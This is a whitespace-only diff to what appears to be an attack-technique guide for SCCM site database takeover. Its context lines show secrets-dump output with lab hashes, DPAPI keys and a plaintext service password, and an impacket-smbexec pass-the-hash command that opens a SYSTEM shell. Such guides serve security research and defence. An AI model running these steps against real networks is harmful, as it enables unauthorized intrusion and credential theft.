@@ -156,24 +156,24 @@ The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are the same except that a di
     MAYYHEM\SITE3-DB$:des-cbc-md5:83f1...7ca4
     MAYYHEM\SITE3-DB$:plain_password_hex:6100...6d00
     MAYYHEM\SITE3-DB$:aad3b435b51404eeaad3b435b51404ee:1eca...baf0:::
-    [*] DPAPI_SYSTEM 
+    [*] DPAPI_SYSTEM
     dpapi_machinekey:0xf470...4a44
     dpapi_userkey:0x09f0....7fcf
-    [*] NL$KM 
+    [*] NL$KM
     ...
     NL$KM:2978...b0c1
-    [*] _SC_MSSQLSERVER 
+    [*] _SC_MSSQLSERVER
     MAYYHEM\sqlsvc:P@ssw0rd
-    [*] _SC_SQLSERVERAGENT 
+    [*] _SC_SQLSERVERAGENT
     MAYYHEM\sqlsvc:P@ssw0rd
-    [*] Cleaning up... 
+    [*] Cleaning up...
     [*] Stopping service RemoteRegistry
     ```
 
 4. Get a shell/agent on the system as SYSTEM:
 
     ```
-    impacket-smbexec Administrator@SITE3-DB.MAYYHEM.LOCAL -hashes ad3b435b51404eeaad3b435b51404ee:e19c...ef42 
+    impacket-smbexec Administrator@SITE3-DB.MAYYHEM.LOCAL -hashes ad3b435b51404eeaad3b435b51404ee:e19c...ef42
     Impacket v0.11.0 - Copyright 2023 Fortra
 
     [!] Launching semi-interactive shell - Careful what you execute
@@ -187,14 +187,14 @@ The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are the same except that a di
     ```
     tasklist /v
 
-    Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
+    Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
     ========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
-    System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                     0:12:41 N/A                                                                     
+    System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                     0:12:41 N/A
     ...
-    sqlservr.exe                  4776 Services                   0    253,152 K Unknown         MAYYHEM\sqlsvc                                          0:00:01 N/A                                                                     
+    sqlservr.exe                  4776 Services                   0    253,152 K Unknown         MAYYHEM\sqlsvc                                          0:00:01 N/A
     ...
-    conhost.exe                   2980 Services                   0     12,976 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
-    tasklist.exe                  4908 Services                   0      8,800 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A 
+    conhost.exe                   2980 Services                   0     12,976 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+    tasklist.exe                  4908 Services                   0      8,800 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
     ```
 
 6. Get the SPN for the database service account:
